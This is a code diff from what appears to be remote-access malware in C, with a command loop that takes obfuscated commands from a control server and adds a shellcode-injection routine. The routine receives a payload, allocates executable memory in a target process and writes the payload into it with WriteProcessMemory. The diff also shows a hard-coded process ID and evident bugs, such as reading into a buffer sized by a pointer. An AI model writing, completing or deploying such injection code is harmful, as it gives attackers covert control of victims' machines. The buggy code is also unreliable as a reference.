@@ -287,9 +287,9 @@ retry:
 		}
 
 		if (Api.strncmp(server_reply, "nsojhy", strlen("nsojhy")) == 0) { //inject
-			char* arch = (char*)Api.malloc(3);
+			char* arch = (char*)Api.malloc(2);
 
-			if (Api.recv(sock, arch, 3, 0) <= 0) {
+			if (Api.recv(sock, arch, 2, 0) <= 0) {
 				//send failed
 				Api.free(arch);
 				Sleep_(Sleep_TIME);
@@ -297,57 +297,75 @@ retry:
 			}
 			CAESAR_DECRYPT(arch);
 
-			// Create a file handle for the memory buffer
-			HANDLE hFile = Api.CreateFileW(
-				L"ykifyk",
-				GENERIC_READ | GENERIC_WRITE,
-				FILE_SHARE_READ | FILE_SHARE_WRITE,
-				NULL,
-				CREATE_ALWAYS,
-				FILE_ATTRIBUTE_NORMAL,
-				NULL);
+			HANDLE hFile = CreateFileMappingW(
+				INVALID_HANDLE_VALUE,   // Use the page file
+				NULL,                   // Default security attributes
+				PAGE_READWRITE,         // Read/write access
+				0,                      // Map the entire file
+				BUFFER_SIZE,                   // Size of the file (in bytes)
+				TEXT("idufhiu"));     // Name of the file mapping object
 
-			upload_file(sock, hFile);
-
-			// Open the file handle for reading
-			hFile = Api.CreateFileW(
-				L"ykifyk",
-				GENERIC_READ,
-				FILE_SHARE_READ | FILE_SHARE_WRITE,
-				NULL,
-				OPEN_EXISTING,
-				FILE_ATTRIBUTE_NORMAL,
-				NULL);
-
-			if (hFile == INVALID_HANDLE_VALUE) {
+			if (hFile == NULL) {
+				Api.free(arch);
 				Sleep_(Sleep_TIME);
 				goto retry;
 			}
 
-			char* buffer = (char*)Api.malloc(BUFFER_SIZE);
-			Api.ReadFile(hFile, buffer, BUFFER_SIZE, NULL, NULL);
-			Api.CloseHandle(hFile);
+			upload_file(sock, hFile);
+
+			// Move the file pointer back to the beginning of the file
+			Api.SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
 
 			HANDLE proc;
-			if (Api.strncmp(arch, "x86", strlen("x86")) == 0) {
-				proc = FindProcessByArch(L"x86");
+			if (Api.strncmp(arch, "32", strlen("32")) == 0) {
+				proc = Api.OpenProcess(PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, (DWORD)18872);//FindProcessByArch(L"x86");
 			}
 			else {
 				proc = FindProcessByArch(L"x64");
 			}
 
+			Api.free(arch);
+
 			if (proc == NULL) {
-				Api.free(arch);
-				Api.free(buffer);
+				Api.CloseHandle(hFile);
 				Sleep_(Sleep_TIME);
 				goto retry;
 			}
 
-			//Api.WriteProcessMemory(proc, (LPVOID)0, "", 0, NULL); WIP
+			// Get the size of the file
+			LARGE_INTEGER fileSize;
+			if (!Api.GetFileSizeEx(hFile, &fileSize))
+			{
+				Api.CloseHandle(hFile);
+				Api.CloseHandle(proc);
+				Sleep_(Sleep_TIME);
+				goto retry;
+			}
 
+			LPVOID addr = Api.VirtualAllocEx(proc, NULL, (size_t)fileSize.QuadPart, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+			if (addr == NULL) {
+				Api.CloseHandle(hFile);
+				Api.CloseHandle(proc);
+				Sleep_(Sleep_TIME);
+				goto retry;
+			}
+
+			DWORD bytesRead;
+			char* shellcode = (char*)Api.malloc((size_t)fileSize.QuadPart);
+			if (!Api.ReadFile(hFile, shellcode, sizeof(shellcode), &bytesRead, NULL))
+			{
+				Api.free(shellcode);
+				Api.CloseHandle(hFile);
+				Api.CloseHandle(proc);
+				Sleep_(Sleep_TIME);
+				goto retry;
+			}
+
+			Api.WriteProcessMemory(proc, addr, shellcode, BUFFER_SIZE, NULL);
+
+			Api.free(shellcode);
+			Api.CloseHandle(hFile);
 			Api.CloseHandle(proc);
-			Api.free(arch);
-			Api.free(buffer);
 		}
 
 		if (Api.strncmp(server_reply, "ljydknqjdqnxy", strlen("ljydknqjdqnxy")) == 0) { //get_file_list
